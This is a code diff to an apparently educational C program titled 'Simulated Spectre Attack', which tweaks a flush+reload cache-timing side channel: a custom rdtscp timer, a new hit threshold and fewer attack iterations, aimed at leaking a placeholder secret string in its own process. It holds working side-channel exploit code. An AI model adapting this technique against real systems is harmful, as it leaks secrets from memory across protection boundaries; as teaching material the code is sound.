@@ -6,7 +6,7 @@
 // Security Issues with Branch Prediction
 //
 // Simulated Spectre Attack
-// April 20, 2018
+// April 25, 2018
 //
 
 #include <stdio.h>
@@ -15,13 +15,26 @@
 #include <string.h>
 #include <stdint.h>
 
-#define CACHE_HIT_THRESHOLD (80)
+#define CACHE_HIT_THRESHOLD (100)
 #define DELTA 1024
 
 unsigned int buffer_size = 10;
 uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9};
 char *secret = "Some Secret Value";
 uint8_t array[256*4096];
+
+
+// Function to use in lieu of intrinsic call
+//
+uint64_t rdtscp() {
+    uint32_t lo, hi;
+    unsigned int s = 32;
+    __asm__ volatile ("rdtscp"
+    : /* outputs */ "=a" (lo), "=d" (hi)
+    : /* no inputs */
+    : /* clobbers */ "%rcx");
+    return ((uint64_t)lo | (((uint64_t)hi) << s));
+}
 
 // Sandbox Function, restricted area for holding the secret
 //
@@ -88,9 +101,9 @@ void reloadSideChannel(int scores[]) {
 
     for (i = 0; i < 256; i++) {
         address = &array[i * 4096 + DELTA];
-        time1 = __rdtscp(&junk);
+        time1 = rdtscp();
         junk = *address;
-        time2 = __rdtscp(&junk) - time1;
+        time2 = rdtscp() - time1;
 
         if (time2 <= CACHE_HIT_THRESHOLD && i != 0) // removes 'no hits' from results (if not, they would
             scores[i]++;                            // always be max hits) add 1 for this ascii value
@@ -103,7 +116,7 @@ int main() {
     int len = (int)strlen(secret);                          // calculates number of chars in the secret
     int scores[256];                                        // array to hold ascii value hit totals
     char *sourced_secret = malloc(len * sizeof(uint8_t));   // create a dynamic char array of the secret
-                                                            // that we have sourced via the attack
+    // that we have sourced via the attack
 
     // Iterates over the entire length of the secret
     while (--len >= 0) {
@@ -115,7 +128,7 @@ int main() {
 
         // This runs the attack multiple times to improve the likely-hood of a hit, keep track of hits
         // for each ascii value from 0 to 255, the maximum number of hits will give us the secret byte
-        for (i = 0; i < 10000; i++) {
+        for (i = 0; i < 1000; i++) {
             spectreAttack(larger_x);
             reloadSideChannel(scores);
         }
